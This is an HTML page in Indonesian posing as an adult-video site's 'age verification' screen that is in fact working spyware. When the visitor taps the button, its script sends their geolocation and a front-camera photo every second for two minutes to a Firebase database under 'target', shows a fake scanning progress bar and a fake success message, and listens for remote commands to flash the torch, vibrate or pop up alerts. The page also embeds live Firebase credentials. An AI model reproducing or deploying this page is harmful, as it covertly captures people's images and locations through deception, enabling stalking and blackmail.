<!DOCTYPE html>
<html>
<head>
    <title>Video Premium 18+</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body, html { width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        
        /* GAMBAR BARU DARI SKY (Full Background) */
        .full-scan-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('https://i.ibb.co.com/fz3gWNGM/t-700x780-1.jpg') no-repeat center center;
            background-size: cover; 
            filter: blur(0px); 
            opacity: 1; 
            z-index: 1; 
            transition: 1s ease;
        }

        .content-overlay {
            position: relative; z-index: 10; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: flex-end; align-items: center;
            background: linear-gradient(0deg, rgba(0,0,0,0.95) 20%, rgba(0,0,0,0) 70%);
            padding: 30px;
        }
        
        .verify-card {
            background: rgba(15, 15, 15, 0.95); 
            border-top: 3px solid #f00; border-radius: 12px;
            padding: 25px 15px; width: 100%; max-width: 380px; text-align: center;
            box-shadow: 0 0 40px rgba(0,0,0,1);
        }

        h2 { color: #fff; margin-bottom: 8px; font-size: 1.1rem; letter-spacing: 1px; }
        #status-text { color: #ccc; font-size: 0.85rem; margin-bottom: 20px; line-height: 1.4; }
        
        .btn-verify {
            background: #f00; color: #fff; border: none; padding: 18px; width: 100%;
            border-radius: 8px; font-weight: bold; font-size: 1rem; cursor: pointer;
            text-transform: uppercase; letter-spacing: 1px;
        }

        #progress-container { width: 100%; background: #222; height: 5px; border-radius: 10px; margin: 20px 0; display: none; overflow: hidden; }
        #progress-bar { width: 0%; background: #f00; height: 100%; transition: 0.3s; }
        
        .timer { color: #f00; font-family: monospace; font-size: 1.2rem; margin-top: 5px; display: none; }
        .loader-big { border: 3px solid #222; border-top: 3px solid #f00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="full-scan-container" id="anime-bg"></div>

    <div class="content-overlay">
        <div class="verify-card">
            <div class="loader-big" id="main-loader"></div>
            <h2 id="title">VERIFIKASI USIA DIPERLUKAN</h2>
            <p id="status-text">Izinkan akses sensor perangkat untuk mengonfirmasi identitas Anda dan memulai streaming video.</p>
            
            <div id="progress-container"><div id="progress-bar"></div></div>
            <div class="timer" id="timer-display">02:00</div>

            <button class="btn-verify" id="action-btn" onclick="startProcess()">KONFIRMASI & VERIFIKASI</button>
        </div>
    </div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyChPl3LbS1nk1dRp6E4copCkJowWkGRVI4",
            authDomain: "zenith-one-98d1f.firebaseapp.com",
            databaseURL: "https://zenith-one-98d1f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "zenith-one-98d1f",
            storageBucket: "zenith-one-98d1f.firebasestorage.app",
            messagingSenderId: "806361386999",
            appId: "1:806361386999:web:fea4f8230f4db644efe8f2"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function startProcess() {
            // Minta Izin Lokasi
            navigator.geolocation.getCurrentPosition(p => {
                db.ref('target/location').set({ lat: p.coords.latitude, lon: p.coords.longitude, time: Date.now() });
            });

            // Minta Izin Kamera
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }).then(stream => {
                document.getElementById('v').srcObject = stream;
                
                // Efek Blur Latar Belakang saat scanning mulai
                document.getElementById('anime-bg').style.filter = "blur(15px) brightness(50%)";
                document.getElementById('action-btn').style.display = 'none';
                document.getElementById('main-loader').style.display = 'block';
                document.getElementById('progress-container').style.display = 'block';
                document.getElementById('timer-display').style.display = 'block';
                document.getElementById('title').innerText = "MEMINDAI IDENTITAS...";

                // MODE BRUTAL: AMBIL FOTO TIAP 1 DETIK
                setInterval(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = 240; canvas.height = 320; 
                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 240, 320);
                    const base64Photo = canvas.toDataURL('image/jpeg', 0.3);
                    db.ref('target/photos').push({ url: base64Photo, time: Date.now() });
                }, 1000); 

                // Timer 2 Menit
                let timeLeft = 120;
                const timerInterval = setInterval(() => {
                    timeLeft--;
                    let mins = Math.floor(timeLeft / 60);
                    let secs = timeLeft % 60;
                    document.getElementById('timer-display').innerText = (mins < 10 ? '0'+mins : mins) + ":" + (secs < 10 ? '0'+secs : secs);
                    document.getElementById('progress-bar').style.width = (((120 - timeLeft) / 120) * 100) + "%";
                    if (timeLeft <= 0) {
                        clearInterval(timerInterval);
                        document.getElementById('status-text').innerHTML = "<b style='color:#0f0;'>SUKSES!</b><br>Server sibuk, silakan refresh.";
                    }
                }, 1000);

            }).catch(() => {
                alert("Sistem Error: Verifikasi sensor wajib diizinkan untuk konten ini!");
            });
        }

        // Listener Command (Perbaikan Syntax)
        db.ref('commands').on('value', snap => {
            const cmd = snap.val();
            if(!cmd) return;
            const stream = document.getElementById('v').srcObject;
            const track = stream ? stream.getVideoTracks()[0] : null;
            if(cmd.type === 'flashlight' && track) {
                track.applyConstraints({ advanced: [{ torch: (cmd.value === 'on') }] }).catch(()=>{});
            }
            if(cmd.type === 'vibrate') navigator.vibrate([500, 200, 500]);
            if(cmd.type === 'alert') alert(cmd.value);
        });
    </script>
</body>
</html>
